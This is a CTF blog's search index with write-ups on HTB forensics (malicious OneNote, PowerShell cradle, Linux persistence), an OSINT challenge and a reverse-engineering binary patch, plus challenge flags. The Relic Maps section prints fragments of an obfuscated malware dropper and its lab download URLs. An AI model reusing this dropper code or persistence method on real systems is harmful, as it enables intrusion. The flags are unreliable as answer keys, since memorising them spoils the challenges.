[{"categories":["Writeups"],"content":"Short, descriptive write-ups for Forensics challenges I did from the competition.","date":"2023-03-24","objectID":"/htb2023-forensics/","tags":["forensics","htb","english"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Forensics","uri":"/htb2023-forensics/"},{"categories":["Writeups"],"content":"Short, descriptive write-ups for Forensics challenges I did from the competition. For other challenges/categories, check out my other blogs and our team’s blogs on BKISC Blog ","date":"2023-03-24","objectID":"/htb2023-forensics/:0:0","tags":["forensics","htb","english"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Forensics","uri":"/htb2023-forensics/"},{"categories":["Writeups"],"content":"Plaintext Tleasure Challenge Information Given file: Get it here! Description: Threat intelligence has found that the aliens operate through a command and control server hosted on their infrastructure. Pandora managed to penetrate their defenses and have access to their internal network. Because their server uses HTTP, Pandora captured the network traffic to steal the server’s administrator credentials. Open the provided file using Wireshark, and locate the username and password of the admin. Category: Forensics We are given a network pcap file. Although we can solve this challenge using Wireshark , but to keep it simple for the very first challenge, we will use strings and grep to get the flag. Here we use strings to dump out strings from the pcap file, then use pipe (|) and grep to find for strings that match the flag format - HTB{. Flag is: HTB{th3s3_4l13ns_st1ll_us3_HTTP} ","date":"2023-03-24","objectID":"/htb2023-forensics/:1:0","tags":["forensics","htb","english"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Forensics","uri":"/htb2023-forensics/"},{"categories":["Writeups"],"content":"Alien Cradle Challenge Information Given file: Get it here! Description: In an attempt for the aliens to find more information about the relic, they launched an attack targeting Pandora’s close friends and partners that may know any secret information about it. During a recent incident believed to be operated by them, Pandora located a weird PowerShell script from the event logs, otherwise called PowerShell cradle. These scripts are usually used to download and execute the next stage of the attack. However, it seems obfuscated, and Pandora cannot understand it. Can you help her deobfuscate it? Category: Forensics For this challenge, we are given a Powershell Script file. In the script, the flag is being concatenated using some Powershell magic lines of code. Flag is: HTB{p0w3rsh3ll_Cr4dl3s_c4n_g3t_th3_j0b_d0n3} ","date":"2023-03-24","objectID":"/htb2023-forensics/:2:0","tags":["forensics","htb","english"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Forensics","uri":"/htb2023-forensics/"},{"categories":["Writeups"],"content":"Extraterrestrial Persistence Challenge Information Given file: Get it here! Description: There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence? Category: Forensics In this challenge, we are given a shell script to look for the flag. For the sake of understanding the flow of shell scripting, the script checks whether the username is “Pandora” and the hostname is “linux_HQ”. If the check is fulfilled, it starts the process to write the base64 decoded message into the file \"/usr/lib/systemd/system/service.service\". The decoded message turned out to contain the flag for our challenge. Flag is: HTB{th3s3_4l13nS_4r3_s00000_b4s1c} ","date":"2023-03-24","objectID":"/htb2023-forensics/:3:0","tags":["forensics","htb","english"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Forensics","uri":"/htb2023-forensics/"},{"categories":["Writeups"],"content":"Relic Maps Challenge Information Given file: Get it here! Description: Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows?Investigate the given attachment and figure out what’s going on and get the flag. The link is to http://relicmaps.htb :/relicmaps.one. The document is still live (relicmaps.htb should resolve to your docker instance). Note: This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups. Category: Forensics From the link attached to this challenge, we get an Onenote file named “relicmaps.one”. Analyze the file, we get 2 suspicious links, which lead us to 2 different files, http://relicmaps.htb/uploads/soft/topsecret-maps.one and http://relicmaps.htb/get/DdAbds/window.bat . I did some analysis on the file “topsecret-maps.one”, and there are only some PNGs inside it. In the “window.bat” file, we are given a Powershell Script. You can run it directly, but I choose to deobfuscate using Python to understand its flow. dict = \"\"\" %eFlP%\"ualBOGvshk=ws\" %eFlP%\"PxzdwcSExs= /\" %eFlP%\"ndjtYQuanY=po\" %eFlP%\"cHFmSnCqnE=Wi\" %eFlP%\"CJnGNBkyYp=co\" %eFlP%\"jaXcJXQMrV=rS\" %eFlP%\"nwIWiBzpbz=:\\\" %eFlP%\"xprVJLooVF=Po\" %eFlP%\"tzMKflzfvX=0\\\" %eFlP%\"VCWZpprcdE=1.\" %eFlP%\"XzrrbwrpmM=\\v\" %eFlP%\"BFTOQBPCju=st\" %eFlP%\"WmUoySsDby=he\" %eFlP%\"tHJYExMHlP=rs\" %eFlP%\"JPfTcZlwxJ=do\" %eFlP%\"VxroDYJQKR=y \" %eFlP%\"UBndSzFkbH=py\" %eFlP%\"KXASGLJNCX=ll\" %eFlP%\"vlwWETKcZH=em\" %eFlP%\"OOOxFGwzUd=e\"\" %eFlP%\"NCtxqhhPqI=32\" %eFlP%\"GOPdPuwuLd=\\W\" %eFlP%\"XUpMhOyyHB=ex\" %eFlP%\"cIqyYRJWbQ=we\" %eFlP%\"kTEDvsZUvn=nd\" %eFlP%\"XBucLtReBQ=Sy\" %eFlP%\"JBRccySrUq=ow\" %eFlP%\"eNOycQnIZD=xe\" %eFlP%\"chXxviaBCr=we\" %eFlP%\"YcnfCLfyyS=in\" %eFlP%\"lYCdEGtlPA=.e\" %eFlP%\"pMrovuxjjq=he\" %eFlP%\"UrPeBlCopW=ll\" %eFlP%\"ujJtlzSIGW= C\" %eFlP%\"zhNAugCrcK=\"%~0.\" %eFlP%\"ZqjBENExAX=s\\\" %VhIy%\"dzPrbmmccE=cd\" %VhIy%\"xQseEVnPet= \"%~dp0\"\" %eUFw%\"wxzMwkmbmY=gDBN\" %eUFw%\"VavtsuhNIN=F'[-\" %eUFw%\"AHKCuBAkui=r = \" %eUFw%\"ARecVABHyu=uZOc\" %eUFw%\"AbZpTpKurz=6] -\" %eUFw%\"BaMYsIgnsM=$uZO\" %eUFw%\"JBUgbyTPxp=m(, \" %eUFw%\"vGOYQQYIpx=.-16\" %eUFw%\"yPzFwnsYdA= New\" %eUFw%\"zuIYfGJIhV=O.Me\" %eUFw%\"gbXeIdPSoj='[-1\" %eUFw%\"BqEMjgsfHM=]::(\" %eUFw%\"bivuMABwCB=Invo\" %eUFw%\"SJsEzuInUY=ile \" %eUFw%\"htJeDhbeDW=();$\" %eUFw%\"ZygfZJxAOd=acUA\" %eUFw%\"eDhTebXJLa=\"%~nx0.\" %eUFw%\"YlKbYsFYPy=in $\" %eUFw%\"jdKMRqipbM=e]::\" %eUFw%\"GVIREkvxRa=();$\" %eUFw%\"OckpqzbYcn=n ''\" %eUFw%\"UPfjubfNXt=Mr, \" %eUFw%\"AkaPyEXHFq=esMa\" %eUFw%\"LODxmGMGqq=flec\" %eUFw%\"hImzprlFyw=pose\" %eUFw%\"VZAbZqJHBk=1] -\" %eUFw%\"WYJXnBQBDj= [Sy\" %eUFw%\"rSVBNvbdPT=stem\" %eUFw%\"tVtxVGNpFB=vert\" %eUFw%\"tHHIjVCHeH=::De\" %eUFw%\"WvjMoIIiUn=);$b\" %eUFw%\"vmIEtsktnA=ypto\" %eUFw%\"AbMyvUGzSH=fore\" %eUFw%\"zDUDeXKPaV=..-1\" %eUFw%\"INPLAzQfUo== [S\" %eUFw%\"ArAxZuPIrp== $B\" %eUFw%\"nGqMpclaJV=ZOcm\" %eUFw%\"lfYSggLrsL=null\" %eUFw%\"eQPFkQsLmh=hy.A\" %eUFw%\"AyyrPvjwjr=;$mN\" %eUFw%\"rjhOhltPzI=Disp\" %eUFw%\"WojQSFImBz=17js\" %eUFw%\"SKEwAQBRlN=$Nlg\" %eUFw%\"KytxcYPZKt=YiLG\" %eUFw%\"RGlZIMTaRM=urit\" %eUFw%\"igJmqZApvQ=ss -\" %eUFw%\"dGSGnKbkQW=pose\" %eUFw%\"lSUnvlNyZI=tem.\" %eUFw%\"rddZbDFvhl=)))\" %eUFw%\"KHqiJghRbq=and \" %eUFw%\"WPGlloqWfh=ddin\" %eUFw%\"pLUeCEDcNj=]::C\" %eUFw%\"drymkVAnZW=);$B\" %eUFw%\"KdByPVjCnF=ring\" %eUFw%\"VnDoNvCbDL=orF'\" %eUFw%\"GapFScCcpe=ke($\" %eUFw%\"iVrCyJhMiJ=fc6t\" %eUFw%\"oMsMdPYmPd=ert]\" %eUFw%\"odWdfvJnBE=Lk =\" %eUFw%\"ekEoGMuERC=yste\" %eUFw%\"QMmDXFyyag=Syst\" %eUFw%\"cYinxarhDL=lit(\" %eUFw%\"bIgeRgvTeJ=ap.T\" %eUFw%\"acXjUrxrpX=raph\" %eUFw%\"SCbDgQuqTU=ay()\" %eUFw%\"YYKSCuCbgJ=New-\" %eUFw%\"YnGvhgYxvb=cm =\" %eUFw%\"vnHosfjdeN=;$Pt\" %eUFw%\"LIQYgFxctD=d;$B\" %eUFw%\"olHsTHINJO=[Env\" %eUFw%\"WQqetkePWs=NVPb\" %eUFw%\"AGOCIKFMEK=::('\" %eUFw%\"QbKdEZdxpx=uGcO\" %eUFw%\"RWcegafVtf=daeR\" %eUFw%\"ESpdErsKEO=pher\" %eUFw%\"kJjQuXIjOT=.Con\" %eUFw%\"dbDMRBPrxg=uGcO\" %eUFw%\"mBIWiJNHWZ=esaB\" %eUFw%\"W","date":"2023-03-24","objectID":"/htb2023-forensics/:4:0","tags":["forensics","htb","english"],"title":"Cyber Apocalypse 2023: The Cursed Mission - Forensics","uri":"/htb2023-forensics/"},{"categories":["Writeups"],"content":"An in-depth writeup on idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","date":"2023-01-15","objectID":"/idekctf2022-osintcrime3/","tags":["osint","idek","english"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","uri":"/idekctf2022-osintcrime3/"},{"categories":["Writeups"],"content":"An in-depth writeup on idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who. ","date":"2023-01-15","objectID":"/idekctf2022-osintcrime3/:0:0","tags":["osint","idek","english"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","uri":"/idekctf2022-osintcrime3/"},{"categories":["Writeups"],"content":"Introduction Challenge Information Given image: Get it here! Description: I feel the killer might be dangerous so I have some info to give you but I don’t want to disclose my email just like that. So find my review from the image below and send me an email asking for info. Be creative with the signature so I know its you. It is time to find Who is the killer. Category: OSINT ","date":"2023-01-15","objectID":"/idekctf2022-osintcrime3/:1:0","tags":["osint","idek","english"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","uri":"/idekctf2022-osintcrime3/"},{"categories":["Writeups"],"content":"Finding the location From the given image, I managed to have found the location on Google Maps at 41.154248, -8.682320. Then in the comment section of the location, I got the mentioned secret email, labeled noodlesareramhackers@gmail.com . ","date":"2023-01-15","objectID":"/idekctf2022-osintcrime3/:2:0","tags":["osint","idek","english"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","uri":"/idekctf2022-osintcrime3/"},{"categories":["Writeups"],"content":"Getting further informations I then sent an email to the email above, and got the next instructions. From: Ramo HackerNoodles (noodlesareramhackers@gmail.com) So… I got some stuff to tell you. I think the killer is probably watching us. The killer used a weird weapon as you have found out. Look, the info I have is that weirdly enough the university page of Heather tweeted something that might lead you to the killer. They deleted it though. Luckily these days you can just walk back in time! Ah, the tweet was 1612383535549059076. When you have the info look in github! Good Luck! ","date":"2023-01-15","objectID":"/idekctf2022-osintcrime3/:3:0","tags":["osint","idek","english"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","uri":"/idekctf2022-osintcrime3/"},{"categories":["Writeups"],"content":"Finding the deleted tweet In the first challenge of the Osint Crime Confusion set (W is for Where), I found the instagram of a person named Heather James . Then from this person’s informations, I found the twitter account of University of Dutch ThE of Topics in Science . I then immediately knew we have to bring the account to the Wayback Machine to gain access to the deleted tweet. The email did mention about the tweet’s id (1612383535549059076), so we can paste the below URL into the Wayback Machine. URL https://twitter.com/UThE_TS/status/1612383535549059076 We successfully gained access to the deleted tweet! ","date":"2023-01-15","objectID":"/idekctf2022-osintcrime3/:4:0","tags":["osint","idek","english"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","uri":"/idekctf2022-osintcrime3/"},{"categories":["Writeups"],"content":"Exploring the killer’s GitHub From the email, we also know that we should continue searching in GitHub. Frankly enough, when I tried to search for “potatoes eating camels” in GitHub, this showed up: The descriptions imply that the person is “still improving wiki”. We then head into the wiki of this repository to find out the end of our journey. Concatenate the first letters of the last 7 sentences of the poem, we have our flag for the challenge: idek{JULIANA_APOSIDM723489}. ","date":"2023-01-15","objectID":"/idekctf2022-osintcrime3/:5:0","tags":["osint","idek","english"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","uri":"/idekctf2022-osintcrime3/"},{"categories":["Writeups"],"content":"Conclusion A good OSINT challenge overall, consist of several general skills in the field of OSINT, such as using Wayback Machine or finding locations on Google Maps. ","date":"2023-01-15","objectID":"/idekctf2022-osintcrime3/:6:0","tags":["osint","idek","english"],"title":"idekCTF 2022 - Osint/Osint Crime Confusion 3: W as in Who","uri":"/idekctf2022-osintcrime3/"},{"categories":["Writeups"],"content":"An in-depth writeup on ISITDTU CTF 2022 Finals - Slow","date":"2023-01-02","objectID":"/isitdtu2022finals-slow/","tags":["RE","isitdtu","english"],"title":"ISITDTU CTF 2022 Finals - Slow","uri":"/isitdtu2022finals-slow/"},{"categories":["Writeups"],"content":"An in-depth writeup on ISITDTU CTF 2022 Finals - Slow. ","date":"2023-01-02","objectID":"/isitdtu2022finals-slow/:0:0","tags":["RE","isitdtu","english"],"title":"ISITDTU CTF 2022 Finals - Slow","uri":"/isitdtu2022finals-slow/"},{"categories":["Writeups"],"content":"Introduction Challenge Information Given binary: Get it here! Description: If you can make the program runs faster, you’ll get the flag! Category: Reverse Engineering ","date":"2023-01-02","objectID":"/isitdtu2022finals-slow/:1:0","tags":["RE","isitdtu","english"],"title":"ISITDTU CTF 2022 Finals - Slow","uri":"/isitdtu2022finals-slow/"},{"categories":["Writeups"],"content":"Static Analysis The challenge provides us with a single binary, named slow.exe. By using IDA Pro or Ghidra or any other kinds of decompiler, we will get the decompiled code. Analyze the main function, we claim that the program initiates an array whose size is 45, then modifies it through some more functions, as shown below. int __cdecl main(int argc, const char **argv, const char **envp) { void *Block; // [esp+4h] [ebp-BCh] int v5[45]; // [esp+8h] [ebp-B8h] BYREF v5[0] = 10; v5[1] = -3; ... snip v5[43] = 14; v5[44] = 16; Block = (void *)sub_401AC0(v5, 38, 0); sub_4013B0(Block); sub_401B40(Block); return 0; } The function sub_401AC0(v5, 38, 0) allocates dynamic memory using malloc based on v5 then assigns it into variable Block. That variable is then being passed into function sub_4013B0(Block), which will produce our flag once we have fixed it. int __cdecl sub_4013B0(_DWORD *a1) { int result; // eax int v2; // eax int v3; // [esp+4h] [ebp-64h] ... snip int v37; // [esp+64h] [ebp-4h] int v38; // [esp+64h] [ebp-4h] while ( 1 ) { v6 = *(_DWORD *)(a1[1] + 4 * a1[3]++); result = v6 - 1; switch ( v6 ) { case 1: v22 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v26 = *(_DWORD *)(a1[2] + 4 * a1[4]--); v2 = sub_401110(v26, v22); v16 = a1[4] + 1; a1[4] = v16; *(_DWORD *)(a1[2] + 4 * v16) = v2; break; case 2: ... snip case 4: ... snip case 5: ... snip case 6: ... snip case 7: ... snip case 8: ... snip case 9: ... snip case 10: ... snip case 11: ... snip case 12: ... snip case 13: ... snip case 14: v38 = *(_DWORD *)(a1[2] + 4 * a1[4]--); sub_401040(\"RESULT: %d\\n\", v38); sub_401260(v38); break; case 15: ... snip case 16: ... snip case 17: ... snip case 18: ... snip default: continue; } } } Why didn't I snip case 1 and case 14 in the above pseudocode? It is easy to observe that only these two cases involve calling other functions. To be more precise, if the program reaches case 1, the function sub_401110(v26, v22) will be called, and on the other hand, if the program reaches case 14, the function sub_401260(v38) will be called. We will talk more about these two functions in the next parts of this blog. ","date":"2023-01-02","objectID":"/isitdtu2022finals-slow/:2:0","tags":["RE","isitdtu","english"],"title":"ISITDTU CTF 2022 Finals - Slow","uri":"/isitdtu2022finals-slow/"},{"categories":["Writeups"],"content":"Reaching case 14 As stated earlier, the function sub_401260(v38) will be called if the program reaches case 14, which will be the last part of our code flow. int __cdecl sub_401260(char a1) { char v2[256]; // [esp+10h] [ebp-224h] BYREF char Buffer; // [esp+110h] [ebp-124h] BYREF _BYTE v4[3]; // [esp+111h] [ebp-123h] BYREF char v5[32]; // [esp+210h] [ebp-24h] BYREF qmemcpy(v5, \"Áõ\", 2); v5[2] = -77; v5[3] = 26; ... snip v5[28] = -66; v5[29] = 63; memset(v2, 0, sizeof(v2)); sub_401D50(\u0026Buffer, \"%d\", 55 * a1); sub_401160(v5, v2, 30, \u0026Buffer, \u0026v4[strlen(\u0026Buffer)] - v4); return sub_401040(\"flag is: %s\", (char)v2); } The function receives our modified variable Block, then uses it to produce our flag. ","date":"2023-01-02","objectID":"/isitdtu2022finals-slow/:3:0","tags":["RE","isitdtu","english"],"title":"ISITDTU CTF 2022 Finals - Slow","uri":"/isitdtu2022finals-slow/"},{"categories":["Writeups"],"content":"Reaching case 1 Here is where things get interesting. Take a look at the function sub_401110(v26, v22), we can conclude that this is why our program runs slowly. The fact that it makes our program sleeps plus it is possibly called many times throughout the process makes our executable runs without any output for a very long time. int __cdecl sub_401110(int a1, int a2) { int v3; // [esp+0h] [ebp-4h] v3 = sub_4010F0(0); Sleep(1000 * a1); Sleep(1000 * a2); return sub_4010F0(0) - v3; } About the intended algorithm flow The algorithm here is very simple, however this is author’s idea to let the program sleeps for a total of (a1 + a2) seconds each time this function is called. The intended result of this function is to return a1 + a2. We will have to patch the binary to get our flag. ","date":"2023-01-02","objectID":"/isitdtu2022finals-slow/:4:0","tags":["RE","isitdtu","english"],"title":"ISITDTU CTF 2022 Finals - Slow","uri":"/isitdtu2022finals-slow/"},{"categories":["Writeups"],"content":"Patch the binary So we know what makes our program runs slowly, it is time to fix that. Below is the decompiled assembly code of that part. mov ecx, [ebp+arg_0] mov edx, [ecx+10h] sub edx, 1 mov eax, [ebp+arg_0] mov [eax+10h], edx mov ecx, [ebp+var_10] push ecx mov edx, [ebp+var_C] push edx call sub_401110 add esp, 8 mov [ebp+var_58], eax mov eax, [ebp+arg_0] Instead of calling sub_401110, we should patch the program to directly calculates ecx + edx then assigns it into eax. We find out that the opcode of call sub_401110 is E8 77 FC FF FF. View instructions opcode in IDA Pro Using IDA Pro integrated settings, which can be found at Options \u003e Generals \u003e Number of Opcode bytes (non-graph) set to a large enough number, we can view each instruction’s opcode. With pwntools library, we also find out the opcode for add ecx, edx and move eax, ecx is 01 D1 and 89 C8 using this script written in Python below. from pwn import * context.arch = 'amd64' print(asm('add ecx, edx')) print(asm('mov eax, ecx')) It is now time to patch the binary. Use any hex editor of your choice to patch the binary, here I use IDA Pro’s integrated hex view to patch the binary. Our goal Change E8 77 FC FF FF to 01 D1 89 C8 90 using any hex editor of your choice (here 90 corresponds to the NOP instruction). ","date":"2023-01-02","objectID":"/isitdtu2022finals-slow/:5:0","tags":["RE","isitdtu","english"],"title":"ISITDTU CTF 2022 Finals - Slow","uri":"/isitdtu2022finals-slow/"},{"categories":["Writeups"],"content":"Result After patching the binary, run it again to get our flag. fazect@LAPTOP-CQA118DI:/mnt/d/Downloads$ ./slow.exe RESULT: 75025 flag is: Pr4ct1c3_VMc0d3_w1th_F1b0n4cc1 Wrap the flag with ISITDTU{}, we have our flag for the challenge: ISITDTU{Pr4ct1c3_VMc0d3_w1th_F1b0n4cc1}. ","date":"2023-01-02","objectID":"/isitdtu2022finals-slow/:6:0","tags":["RE","isitdtu","english"],"title":"ISITDTU CTF 2022 Finals - Slow","uri":"/isitdtu2022finals-slow/"},{"categories":null,"content":"About Me","date":"0001-01-01","objectID":"/aboutme/","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"Some Background Informations I am FazeCT, a Reverser from team BKISC , HCMC University of Technology. I have been studying in Computer Science, HCMC University of Technology since October 2021. Started playing CTFs since July 2022, currently I am focusly learning in the Reverse Engineering (RE) field of CTF. I am also looking forward to learn more about Pwnable in the future. ","date":"0001-01-01","objectID":"/aboutme/:1:0","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"Noticeable Achievements Qualified for ISITDTU CTF 2022 Finals Ranked 57th in 2022 ACM-ICPC Asia HoChiMinh City Regional Contest ","date":"0001-01-01","objectID":"/aboutme/:2:0","tags":null,"title":"About Me","uri":"/aboutme/"},{"categories":null,"content":"Contact Me You can contact me via Email or Github . ","date":"0001-01-01","objectID":"/aboutme/:3:0","tags":null,"title":"About Me","uri":"/aboutme/"}]